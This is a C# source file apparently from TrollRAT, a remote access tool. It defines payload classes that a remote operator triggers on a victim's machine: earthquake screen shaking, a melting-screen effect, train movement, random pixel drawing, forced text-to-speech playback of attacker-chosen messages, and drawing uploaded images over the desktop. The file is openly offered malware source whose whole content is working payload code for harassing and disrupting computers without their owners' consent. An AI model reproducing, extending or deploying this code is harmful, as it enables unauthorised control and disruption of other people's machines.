using System;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Windows.Forms;
using TrollRAT.Payloads;
using TrollRAT.Server.Commands;
using TrollRATPayloads.Actions;
using TrollRATPayloads.Utils;

namespace TrollRATPayloads.Payloads
{
    public class PayloadEarthquake : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadEarthquake(int delay, int power);

        private PayloadSettingNumber power = new PayloadSettingNumber(20, "Movement Factor", 2, 60, 1);

        public PayloadEarthquake() : base(4)
        {
            actions.Add(new PayloadActionClearScreen(this));
            settings.Add(power);

            name = "Earthquake (Shake Screen)";
        }

        protected override void execute()
        {
            payloadEarthquake((int)Delay, (int)power.Value);
        }
    }

    public class PayloadMeltingScreen : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadMeltingScreen(int xSize, int ySize, int power, int distance);

        private PayloadSettingNumber xSize = new PayloadSettingNumber(30, "X Size", 1, 200, 1);
        private PayloadSettingNumber ySize = new PayloadSettingNumber(8, "Y Size", 1, 200, 1);
        private PayloadSettingNumber power = new PayloadSettingNumber(10, "Power", 1, 40, 1);
        private PayloadSettingNumber distance = new PayloadSettingNumber(1, "Distance between bars", 1, 500, 1);

        public PayloadMeltingScreen() : base(4)
        {
            actions.Add(new PayloadActionClearScreen(this));
            settings.Add(xSize);
            settings.Add(ySize);
            settings.Add(distance);
            settings.Add(power);

            name = "Melting Screen";
        }

        protected override void execute()
        {
            payloadMeltingScreen((int)xSize.Value, (int)ySize.Value, (int)power.Value, (int)distance.Value);
        }
    }

    public class PayloadTrain : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadTrain(int xPower, int yPower);

        private PayloadSettingNumber xPower = new PayloadSettingNumber(10, "X Movement", -100, 100, 1);
        private PayloadSettingNumber yPower = new PayloadSettingNumber(0, "Y Movement", -100, 100, 1);

        public PayloadTrain() : base(5)
        {
            actions.Add(new PayloadActionClearScreen(this));
            settings.Add(xPower);
            settings.Add(yPower);

            name = "Train/Elevator Effect";
        }

        protected override void execute()
        {
            payloadTrain((int)xPower.Value, (int)yPower.Value);
        }
    }

    public class PayloadDrawPixels : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadDrawPixels(uint color, int power);

        private PayloadSettingNumber power = new PayloadSettingNumber(500, "Changed Pixels per Iteration", 1, 10000, 1);
        protected PayloadSettingSelect color = new PayloadSettingSelect(0, "Color",
            new string[] { "Black", "White", "Red", "Green", "Blue", "Random (Black/White)", "Random (RGB)" });

        private static readonly uint[] colors = new uint[] { 0x000000, 0xFFFFFF, 0x0000FF, 0x00FF00, 0xFF0000 };

        private Random rng = new Random();

        public PayloadDrawPixels() : base(1)
        {
            actions.Add(new PayloadActionClearScreen(this));

            settings.Add(power);
            settings.Add(color);

            name = "Draw Pixels on Screen";
        }

        protected override void execute()
        {
            uint c;

            if (color.Value == colors.Length)
                c = rng.NextDouble() > 0.5 ? colors[0] : colors[1];
            else if (color.Value == colors.Length + 1)
                c = (uint)rng.Next();
            else
                c = colors[color.Value];

            payloadDrawPixels(c, (int)power.Value);
        }
    }

    public class PayloadTTS : ExecutablePayload
    {
        protected class PayloadSettingVoice : PayloadSettingSelectBase
        {
            public InstalledVoice SelectedVoice => synth.GetInstalledVoices()[value];

            public PayloadSettingVoice(string title) : base(0, title) { }

            public override string[] Options
            {
                get
                {
                    return (from voice in synth.GetInstalledVoices()
                            select voice.VoiceInfo.Name).ToArray();
                }
                set { throw new NotImplementedException(); }
            }
        }

        protected class PayloadActionStop : SimplePayloadAction
        {
            public PayloadActionStop(Payload payload) : base(payload) { }

            public override string Icon => null;
            public override string Title => "Stop Speaking";

            public override string execute()
            {
                synth.SpeakAsyncCancelAll();
                return "void(0);";
            }
        }

        private PayloadSettingString message = new PayloadSettingString(
            "soi soi soi soi soi soi soi soi soi soi soi", "Message to speak");

        private PayloadSettingNumber rate = new PayloadSettingNumber(1, "Speed Rate", -10, 10, 1);
        private PayloadSettingNumber volume = new PayloadSettingNumber(100, "Volume", 0, 100, 1);

        private PayloadSettingVoice voice = new PayloadSettingVoice("TTS Voice");

        protected static SpeechSynthesizer synth = new SpeechSynthesizer();

        public PayloadTTS()
        {
            settings.Add(message);
            settings.Add(voice);
            settings.Add(volume);
            settings.Add(rate);

            actions.Add(new PayloadActionStop(this));

            synth.SetOutputToDefaultAudioDevice();

            name = "Play TTS Voice";
        }

        protected override void execute()
        {
            synth.Rate = (int)rate.Value;
            synth.Volume = (int)volume.Value;

            synth.SelectVoice(voice.SelectedVoice.VoiceInfo.Name);

            try
            {
                synth.Speak(message.Value);
            }
            catch (Exception) { }
        }
    }

    public class PayloadDrawImages : LoopingPayload
    {
        private PayloadSettingNumber scaleFactor = new PayloadSettingNumber(100, "Scale Factor (in %)", 1, 100, 1);
        private PayloadSettingSelectFile fileName = new PayloadSettingSelectFile(
            0, "Uploaded File Name", UploadCommand.uploadDir);
        private PayloadSettingSelect mode = new PayloadSettingSelect(0, "Mode",
            new string[] { "Draw Image to Screen directly", "Overlay Image on Screen" });

        private Random rng = new Random();

        private Bitmap image;
        private Graphics drawingArea;

        internal void imageChanged<t>(object sender, t selectedFile)
        {
            try
            {
                if (image != null)
                {
                    image.Dispose();
                    image = null;
                }

                using (Bitmap newImage = new Bitmap(fileName.selectedFilePath))
                {
                    image = new Bitmap(newImage, new Size((int)(newImage.Width * (scaleFactor.Value / 100)),
                        (int)(newImage.Height * (scaleFactor.Value / 100))));
                }
            } catch (Exception) { }
        }

        internal void modeChanged(object sender, int value)
        {
            switch (value)
            {
                case 0:
                    drawingArea = OverlayWindow.ScreenGraphics;
                    break;
                case 1:
                    drawingArea = OverlayWindow.OverlayGrahpics;
                    break;
            }
        }

        public PayloadDrawImages() : base(10)
        {
            settings.Add(fileName);
            settings.Add(scaleFactor);
            settings.Add(mode);

            actions.Add(new PayloadActionClearScreen(this));

            imageChanged(null, 0);
            modeChanged(null, 0);

            scaleFactor.SettingChanged += new PayloadSettingNumber.PayloadSettingChangeEvent(imageChanged);
            fileName.SettingChanged += new PayloadSettingSelectFile.PayloadSettingChangeEvent(imageChanged);
            mode.SettingChanged += new PayloadSettingSelect.PayloadSettingChangeEvent(modeChanged);

            name = "Draw Uploaded Images";
        }

        protected override void execute()
        {
            if (image != null && drawingArea != null)
            {
                switch (mode.Value)
                {
                    case 0:
                    case 1:
                        int x = rng.Next(0, Screen.PrimaryScreen.Bounds.Width - image.Width);
                        int y = rng.Next(0, Screen.PrimaryScreen.Bounds.Height - image.Height);

                        try
                        {
                            drawingArea.DrawImageUnscaled(image, x, y);
                        }
                        catch (Exception) { }
                        

                        break;
                }

                if (mode.Value > 0)
                    OverlayWindow.updateOverlay();
            }
        }
    }
}
